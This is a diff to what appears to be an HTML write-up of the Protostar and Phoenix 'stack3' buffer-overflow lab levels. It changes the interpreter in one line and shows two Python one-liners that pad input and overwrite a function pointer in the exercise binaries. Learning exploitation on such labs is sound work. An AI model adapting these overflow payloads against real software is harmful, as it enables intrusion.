@@ -65,7 +65,7 @@ This involved a little bit poking aroung with GDB. Opening the file in the debug
 
 The command for crafting are <ul>
 <li> For Protostar: python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3 </li>
-<li> For Phoenix: python3 -c "print('A' * 63 + '\x9d\x06\x40\x00\x00\x00\x00\x00')" | /opt/phoenix/amd64/stack-three </li>
+<li> For Phoenix: python -c "print('A' * 63 + '\x9d\x06\x40\x00\x00\x00\x00\x00')" | /opt/phoenix/amd64/stack-three </li>
 </ul>
 
 <footer> In Phoenix level, it seems that `gets()` writes a '\n' to the input string. So instead of creating a string of length 64, we need a length of 63 </footer>
